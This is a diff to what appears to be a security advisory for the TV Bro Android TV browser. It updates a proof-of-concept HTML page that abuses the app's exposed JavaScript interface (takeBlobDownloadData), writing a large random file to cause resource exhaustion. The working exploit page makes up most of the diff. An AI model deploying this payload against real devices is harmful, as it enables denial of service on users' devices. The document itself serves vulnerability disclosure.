@@ -18,7 +18,7 @@ The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external 
 
 ##### Proof of Concept:
 
-![poc](https://github.com/actuator/com.phlox.tvwebbrowser/assets/78701239/a1ebc5df-61c0-481d-beac-01b457bff30d)
+![poc](https://github.com/actuator/com.phlox.tvwebbrowser/assets/78701239/581c4577-3ee5-4277-8fe9-2109921a18ec)
 
 
 
@@ -57,14 +57,45 @@ Below is a sample payload that exploits the vulnerability by attempting to creat
 ```html
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit Page</title>
+    <title>TV Bro Exploit Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+
+        button {
+            background-color: red;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+
+        #warning {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
 </head>
+
 <body>
+
+    <h1 id="warning">WARNING: Exploit Demonstration</h1>
+    <p>This page demonstrates the potential risks associated with the JavaScript interface vulnerability found in the "TV Bro" application.</p>
+
+    <h2>Exploit Details</h2>
+    <p>An attacker can generate an extremely large file which can lead to resource exhaustion and potential denial-of-service scenarios on the user's device.</p>
+
+    <button onclick="triggerExploit()">Trigger Exploit</button>
+
+    <div id="status"></div>
+
     <script>
-        // Generate a large random base64 string 
         function generateRandomBase64String(length) {
             let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
             let result = '';
@@ -74,12 +105,25 @@ Below is a sample payload that exploits the vulnerability by attempting to creat
             return result;
         }
 
-        // Check if the JS interface method exists
-        if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
-            // Send an extremely large base64 data to the method
-            window.TVBro.takeBlobDownloadData(generateRandomBase64String(50005000000050000000500000005000000050000000500000000000), 'exploit.txt', 'text/plain');
+        function triggerExploit() {
+            const size = 500000; // You can adjust this as necessary
+            const base64Data = generateRandomBase64String(size);
+            const fileName = 'exploit.txt';
+            const url = 'https://example.com/exploit'; // Replace with an appropriate URL or keep as dummy
+            const mimeType = 'text/plain';
+
+            if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
+                document.getElementById('status').innerText = "About to invoke the interface...";
+                window.TVBro.takeBlobDownloadData(base64Data, fileName, url, mimeType);
+                document.getElementById('status').innerText = "Invoked the interface. Waiting for a response...";
+            } else {
+                document.getElementById('status').innerText = "Interface not found. Are you sure you're inside the vulnerable version of TV Bro?";
+            }
         }
     </script>
+
 </body>
+
 </html>
+
 ```html
